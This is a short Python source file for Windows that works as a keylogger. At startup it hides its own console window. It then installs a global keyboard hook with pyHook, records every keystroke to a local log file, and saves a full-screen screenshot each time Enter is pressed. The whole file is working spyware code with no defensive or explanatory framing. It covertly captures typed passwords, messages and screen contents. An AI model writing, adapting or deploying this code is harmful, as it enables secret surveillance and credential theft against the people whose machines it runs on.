import win32api
import win32console
import win32gui
import pythoncom,pyHook
import time
from PIL import ImageGrab

def screenshot():
	fname = time.strftime('%Y_%m_%d_%H_%M_%S')+".png"
	ImageGrab.grab().save(fname, "PNG")

#On startup hide the process
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
logPath = "log.txt"
logBuffer = ""

# Create and open log file
filePointer = open(logPath, "w")
filePointer.write(time.strftime('%Y_%m_%d_%H_%M_%S'))
filePointer.write("\n")
filePointer.close()
def OnKeyboardEvent(event):
	#print "got event"
	global logBuffer
	if event.Ascii == 8: #backspace remove the last character from the buffer
		if len(logBuffer) > 0:
			logBuffer = logBuffer[:-1]
	elif event.Ascii  == 9: # tab was pressed
		logBuffer = logBuffer + "\t"
	elif event.Ascii == 13: # This is the new line character write to buffer appropriately
		fp = open(logPath, "a")
		logBuffer = logBuffer + "\n"
		fp.write(logBuffer)
		logBuffer = ""
		fp.close()
		screenshot()
	elif event.Ascii == 17:
			logBuffer = logBuffer + "[CONTROL]"
	elif event.Ascii == 18:
			logBuffer = logBuffer + "[CONTROL]"
	elif event.Ascii == 14: # These are the codes for the shift key and escape key
		pass
	elif event.Ascii == 15: # we will not log these key presses since they are 
		pass
	elif event.Ascii == 27: # modifiers
		pass
	else:
		logBuffer = logBuffer + chr(event.Ascii)
# create a hook manager object
hm=pyHook.HookManager()
#Set callback function
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
